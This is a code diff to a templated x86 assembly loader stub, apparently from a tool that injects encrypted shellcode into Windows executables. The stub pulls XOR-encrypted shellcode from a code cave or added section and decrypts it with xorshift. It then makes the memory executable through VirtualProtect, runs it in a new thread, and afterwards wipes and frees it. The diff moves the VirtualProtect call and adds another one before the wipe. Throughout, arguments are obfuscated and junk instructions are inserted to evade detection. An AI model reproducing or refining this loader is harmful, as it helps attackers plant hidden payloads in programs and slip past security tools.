@@ -335,144 +335,159 @@ entry:
   dec {{.RegV.ecx}}                                            {{igi}}
   jnz loop_padding                                             {{igi}}
 
-  // adjust memory region protect
-  mov  {{.RegV.eax}}, [esp+0x10]                               {{igi}} // address of VirtualProtect
-  mov  {{.RegV.ecx}}, [esp+0x04]                               {{igi}} // lpAddress
-  sub esp, 0x04                                                {{igi}} // lpflOldProtect
-  push esp                                                     {{igi}} // push argument
-  mov  {{.RegV.edx}}, {{hex .PAData.NewProtect}}               {{igi}} // PAGE_EXECUTE_READWRITE
-  xor  {{.RegV.edx}}, {{hex .PAKey.NewProtect}}                {{igi}} // decrypt argument
-  push {{.RegV.edx}}                                           {{igi}} // push argument
-  mov  {{.RegV.edx}}, {{hex .MemRegionSize}}                   {{igi}} // dwSize
-  push {{.RegV.edx}}                                           {{igi}} // push argument
-  mov  {{.RegV.edx}}, {{.RegV.ecx}}                            {{igi}} // lpAddress
-  push {{.RegV.edx}}                                           {{igi}} // push argument
-  call {{.RegV.eax}}                                           {{igi}} // call VirtualProtect
-  add esp, 0x04                                                {{igi}} // restore stack for old protect
-
 // ================================= prepare shellcode =================================
 
 {{if .CodeCaveMode}}
   // extract encrypted shellcode from code cave
-  push {{.RegN.edi}}                           {{igi}} // save "edi"
-  mov {{.RegN.ebx}}, {{hex .PayloadKey}}       {{igi}} // key of encrypted shellcode
-  mov {{.RegN.edi}}, [esp+0x04]                {{igi}} // address of allocated memory page
-  add {{.RegN.edi}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
+  push {{.RegN.edi}}                               {{igi}} // save "edi"
+  mov {{.RegN.ebx}}, {{hex .PayloadKey}}           {{igi}} // key of encrypted shellcode
+  mov {{.RegN.edi}}, [esp+0x04]                    {{igi}} // address of allocated memory page
+  add {{.RegN.edi}}, {{hex .EntryOffset}}          {{igi}} // address of shellcode
   {{STUB CodeCaveMode STUB}}
-  pop {{.RegN.edi}}                            {{igi}} // restore "edi"
+  pop {{.RegN.edi}}                                {{igi}} // restore "edi"
 {{end}}
 
 {{if or .CodeCaveNSMode .ExtendTextMode .ExtendTextNSMode .CreateTextMode}}
   // save esi and edi
-  push esi                                     {{igi}}
-  push edi                                     {{igi}}
+  push esi                                         {{igi}}
+  push edi                                         {{igi}}
 
   // extract encrypted shellcode from section
-  mov esi, {{.RegN.edi}}                       {{igi}} // address of image base
-  add esi, {{hex .PayloadRVA}}                 {{igi}} // address of encrypted shellcode
-  mov edi, [esp+0x0C]                          {{igi}} // address of allocated memory page
-  add edi, {{hex .EntryOffset}}                {{igi}} // address of shellcode
-  mov {{.RegV.ecx}}, {{hex .PayloadSize}}      {{igi}} // set loop times
+  mov esi, {{.RegN.edi}}                           {{igi}} // address of image base
+  add esi, {{hex .PayloadRVA}}                     {{igi}} // address of encrypted shellcode
+  mov edi, [esp+0x0C]                              {{igi}} // address of allocated memory page
+  add edi, {{hex .EntryOffset}}                    {{igi}} // address of shellcode
+  mov {{.RegV.ecx}}, {{hex .PayloadSize}}          {{igi}} // set loop times
  loop_extract:
-  movsb                                        {{igi}}
-  inc esi                                      {{igi}}
+  movsb                                            {{igi}}
+  inc esi                                          {{igi}}
   // check extract shellcode is finish
-  dec {{.RegV.ecx}}                            {{igi}}
-  jnz loop_extract                             {{igi}}
+  dec {{.RegV.ecx}}                                {{igi}}
+  jnz loop_extract                                 {{igi}}
 
   // decrypt shellcode in the memory page
-  mov {{.RegV.eax}}, {{hex .PayloadKey}}       {{igi}} // key of encrypted shellcode
-  mov {{.RegV.edx}}, [esp+0x0C]                {{igi}} // address of allocated memory page
-  add {{.RegV.edx}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
-  mov {{.RegV.ecx}}, {{hex .PayloadSize}}      {{igi}} // set loop times
+  mov {{.RegV.eax}}, {{hex .PayloadKey}}           {{igi}} // key of encrypted shellcode
+  mov {{.RegV.edx}}, [esp+0x0C]                    {{igi}} // address of allocated memory page
+  add {{.RegV.edx}}, {{hex .EntryOffset}}          {{igi}} // address of shellcode
+  mov {{.RegV.ecx}}, {{hex .PayloadSize}}          {{igi}} // set loop times
  loop_decrypt:
-  mov edi, [{{.RegV.edx}}]                     {{igi}}
-  xor edi, {{.RegV.eax}}                       {{igi}}
-  mov [{{.RegV.edx}}], edi                     {{igi}}
+  mov edi, [{{.RegV.edx}}]                         {{igi}}
+  xor edi, {{.RegV.eax}}                           {{igi}}
+  mov [{{.RegV.edx}}], edi                         {{igi}}
   // update the key with xorshift32
-  call xor_shift                               {{igi}}
+  call xor_shift                                   {{igi}}
   // check decrypt shellcode is finish
-  add {{.RegV.edx}}, 4                         {{igi}}
-  sub {{.RegV.ecx}}, 4                         {{igi}}
-  jnz loop_decrypt                             {{igi}}
+  add {{.RegV.edx}}, 4                             {{igi}}
+  sub {{.RegV.ecx}}, 4                             {{igi}}
+  jnz loop_decrypt                                 {{igi}}
 
   // restore edi and esi
-  pop edi                                      {{igi}}
-  pop esi                                      {{igi}}
+  pop edi                                          {{igi}}
+  pop esi                                          {{igi}}
 {{end}}
 
 // ================================== execute shellcode ==================================
 
+  // adjust memory region protect before execute
+  mov  {{.RegV.eax}}, [esp+0x10]                   {{igi}} // address of VirtualProtect
+  mov  {{.RegV.ecx}}, [esp+0x04]                   {{igi}} // lpAddress
+  sub esp, 0x04                                    {{igi}} // lpflOldProtect
+  push esp                                         {{igi}} // push argument
+  mov  {{.RegV.edx}}, {{hex .PAData.NewProtect}}   {{igi}} // flNewProtect
+  xor  {{.RegV.edx}}, {{hex .PAKey.NewProtect}}    {{igi}} // decrypt argument
+  push {{.RegV.edx}}                               {{igi}} // push argument
+  mov  {{.RegV.edx}}, {{hex .MemRegionSize}}       {{igi}} // dwSize
+  push {{.RegV.edx}}                               {{igi}} // push argument
+  mov  {{.RegV.edx}}, {{.RegV.ecx}}                {{igi}} // lpAddress
+  push {{.RegV.edx}}                               {{igi}} // push argument
+  call {{.RegV.eax}}                               {{igi}} // call VirtualProtect
+  add esp, 0x04                                    {{igi}} // restore stack for old protect
+  
 {{if .NeedCreateThread}}
   {{if .NeedShellcodeJumper}}
-    mov {{.RegV.ecx}}, {{.RegN.edi}}           {{igi}} // address of image base
-    add {{.RegV.ecx}}, {{hex .JumperRVA}}      {{igi}} // address of shellcode jumper
-    mov {{.RegV.edx}}, [esp+0x04]              {{igi}} // address of memory page
-    add {{.RegV.edx}}, {{hex .EntryOffset}}    {{igi}} // address of shellcode
+    mov {{.RegV.ecx}}, {{.RegN.edi}}               {{igi}} // address of image base
+    add {{.RegV.ecx}}, {{hex .JumperRVA}}          {{igi}} // address of shellcode jumper
+    mov {{.RegV.edx}}, [esp+0x04]                  {{igi}} // address of memory page
+    add {{.RegV.edx}}, {{hex .EntryOffset}}        {{igi}} // address of shellcode
   {{else}}
-    mov {{.RegV.ecx}}, [esp+0x04]              {{igi}} // address of memory page
-    add {{.RegV.ecx}}, {{hex .EntryOffset}}    {{igi}} // address of shellcode
-    xor {{.RegV.edx}}, {{.RegV.edx}}           {{igi}} // clear register for lpParameter
+    mov {{.RegV.ecx}}, [esp+0x04]                  {{igi}} // address of memory page
+    add {{.RegV.ecx}}, {{hex .EntryOffset}}        {{igi}} // address of shellcode
+    xor {{.RegV.edx}}, {{.RegV.edx}}               {{igi}} // clear register for lpParameter
   {{end}}
 
-  xor {{.RegV.eax}}, {{.RegV.eax}}             {{igi}} // clear register for push 0
-  push {{.RegV.eax}}                           {{igi}} // lpThreadId
-  push {{.RegV.eax}}                           {{igi}} // dwCreationFlags
-  push {{.RegV.edx}}                           {{igi}} // lpParameter
-  push {{.RegV.ecx}}                           {{igi}} // lpStartAddress
-  push {{.RegV.eax}}                           {{igi}} // dwStackSize
-  push {{.RegV.eax}}                           {{igi}} // lpThreadAttributes
-  mov {{.RegV.eax}}, [esp+0x2C]                {{igi}} // address of CreateThread
-  call {{.RegV.eax}}                           {{igi}} // call CreateThread
+  xor {{.RegV.eax}}, {{.RegV.eax}}                 {{igi}} // clear register for push 0
+  push {{.RegV.eax}}                               {{igi}} // lpThreadId
+  push {{.RegV.eax}}                               {{igi}} // dwCreationFlags
+  push {{.RegV.edx}}                               {{igi}} // lpParameter
+  push {{.RegV.ecx}}                               {{igi}} // lpStartAddress
+  push {{.RegV.eax}}                               {{igi}} // dwStackSize
+  push {{.RegV.eax}}                               {{igi}} // lpThreadAttributes
+  mov {{.RegV.eax}}, [esp+0x2C]                    {{igi}} // address of CreateThread
+  call {{.RegV.eax}}                               {{igi}} // call CreateThread
 
   {{if .NeedWaitThread}}
-    mov edx, {{hex .PAData.Infinite}}          {{igi}} // dwMilliseconds, INFINITE
-    xor edx, {{hex .PAKey.Infinite}}           {{igi}} // decrypt argument
-    push edx                                   {{igi}} // push argument
-    push eax                                   {{igi}} // hHandle, hThread
-    mov {{.RegV.eax}}, [esp+0x20]              {{igi}} // address of WaitForSingleObject
-    call {{.RegV.eax}}                         {{igi}} // call WaitForSingleObject
+    mov edx, {{hex .PAData.Infinite}}              {{igi}} // dwMilliseconds, INFINITE
+    xor edx, {{hex .PAKey.Infinite}}               {{igi}} // decrypt argument
+    push edx                                       {{igi}} // push argument
+    push eax                                       {{igi}} // hHandle, hThread
+    mov {{.RegV.eax}}, [esp+0x20]                  {{igi}} // address of WaitForSingleObject
+    call {{.RegV.eax}}                             {{igi}} // call WaitForSingleObject
   {{end}}
 {{else}}
-  mov {{.RegV.eax}}, [esp+0x04]                {{igi}} // address of allocated memory
-  add {{.RegV.eax}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
-  call {{.RegV.eax}}                           {{igi}} // call shellcode
+  mov {{.RegV.eax}}, [esp+0x04]                    {{igi}} // address of allocated memory
+  add {{.RegV.eax}}, {{hex .EntryOffset}}          {{igi}} // address of shellcode
+  call {{.RegV.eax}}                               {{igi}} // call shellcode
 {{end}}
 
 // =================================== erase shellcode ===================================
 
 {{if .NeedEraseShellcode}}
+  // adjust memory region protect before erase
+  mov  {{.RegV.eax}}, [esp+0x10]                   {{igi}} // address of VirtualProtect
+  mov  {{.RegV.ecx}}, [esp+0x04]                   {{igi}} // lpAddress
+  sub esp, 0x04                                    {{igi}} // lpflOldProtect
+  push esp                                         {{igi}} // push argument
+  mov  {{.RegV.edx}}, {{hex .PAData.Protect}}      {{igi}} // PAGE_READWRITE
+  xor  {{.RegV.edx}}, {{hex .PAKey.Protect}}       {{igi}} // decrypt argument
+  push {{.RegV.edx}}                               {{igi}} // push argument
+  mov  {{.RegV.edx}}, {{hex .MemRegionSize}}       {{igi}} // dwSize
+  push {{.RegV.edx}}                               {{igi}} // push argument
+  mov  {{.RegV.edx}}, {{.RegV.ecx}}                {{igi}} // lpAddress
+  push {{.RegV.edx}}                               {{igi}} // push argument
+  call {{.RegV.eax}}                               {{igi}} // call VirtualProtect
+  add esp, 0x04                                    {{igi}} // restore stack for old protect
+
   // overwrite memory data
-  mov {{.RegV.edx}}, [esp+0x04]                {{igi}} // address of memory page
-  add {{.RegV.edx}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
-  mov {{.RegV.ecx}}, {{hex .PayloadSize}}      {{igi}} // set loop times
-  sub {{.RegV.ecx}}, 3                         {{igi}} // adjust loop times
+  mov {{.RegV.edx}}, [esp+0x04]                    {{igi}} // address of memory page
+  add {{.RegV.edx}}, {{hex .EntryOffset}}          {{igi}} // address of shellcode
+  mov {{.RegV.ecx}}, {{hex .PayloadSize}}          {{igi}} // set loop times
+  sub {{.RegV.ecx}}, 3                             {{igi}} // adjust loop times
   // calculate a random seed from registers
-  add {{.RegV.eax}}, esp                       {{igi}}
-  add {{.RegV.eax}}, {{.Reg.ebx}}              {{igi}}
-  add {{.RegV.eax}}, {{.Reg.ecx}}              {{igi}}
-  add {{.RegV.eax}}, {{.Reg.edx}}              {{igi}}
-  add {{.RegV.eax}}, {{.Reg.esi}}              {{igi}}
-  add {{.RegV.eax}}, {{.Reg.edi}}              {{igi}}
+  add {{.RegV.eax}}, esp                           {{igi}}
+  add {{.RegV.eax}}, {{.Reg.ebx}}                  {{igi}}
+  add {{.RegV.eax}}, {{.Reg.ecx}}                  {{igi}}
+  add {{.RegV.eax}}, {{.Reg.edx}}                  {{igi}}
+  add {{.RegV.eax}}, {{.Reg.esi}}                  {{igi}}
+  add {{.RegV.eax}}, {{.Reg.edi}}                  {{igi}}
  loop_erase:
   // it will waste some loop but clean code
-  call xor_shift                               {{igi}}
-  mov [{{.RegV.edx}}], {{.RegV.eax}}           {{igi}}
+  call xor_shift                                   {{igi}}
+  mov [{{.RegV.edx}}], {{.RegV.eax}}               {{igi}}
   // check erase instruction is finish
-  inc {{.RegV.edx}}                            {{igi}}
-  dec {{.RegV.ecx}}                            {{igi}}
-  jnz loop_erase                               {{igi}}
+  inc {{.RegV.edx}}                                {{igi}}
+  dec {{.RegV.ecx}}                                {{igi}}
+  jnz loop_erase                                   {{igi}}
 
   // release allocated memory page
-  mov {{.RegV.eax}}, [esp+0x0C]                {{igi}} // address of VirtualFree
-  mov {{.RegV.ecx}}, [esp+0x04]                {{igi}} // address of allocated memory
-  mov {{.RegV.edx}}, {{hex .PAData.FreeType}}  {{igi}} // dwFreeType MEM_RELEASE
-  xor {{.RegV.edx}}, {{hex .PAKey.FreeType}}   {{igi}} // decrypt argument
-  push {{.RegV.edx}}                           {{igi}} // push argument
-  xor {{.RegV.edx}}, {{.RegV.edx}}             {{igi}} // dwSize
-  push {{.RegV.edx}}                           {{igi}} // push argument
-  push {{.RegV.ecx}}                           {{igi}} // lpAddress
-  call {{.RegV.eax}}                           {{igi}} // call VirtualFree
+  mov {{.RegV.eax}}, [esp+0x0C]                    {{igi}} // address of VirtualFree
+  mov {{.RegV.ecx}}, [esp+0x04]                    {{igi}} // address of allocated memory
+  mov {{.RegV.edx}}, {{hex .PAData.FreeType}}      {{igi}} // dwFreeType MEM_RELEASE
+  xor {{.RegV.edx}}, {{hex .PAKey.FreeType}}       {{igi}} // decrypt argument
+  push {{.RegV.edx}}                               {{igi}} // push argument
+  xor {{.RegV.edx}}, {{.RegV.edx}}                 {{igi}} // dwSize
+  push {{.RegV.edx}}                               {{igi}} // push argument
+  push {{.RegV.ecx}}                               {{igi}} // lpAddress
+  call {{.RegV.eax}}                               {{igi}} // call VirtualFree
 {{end}}
 
 // ================================== clean environment ==================================
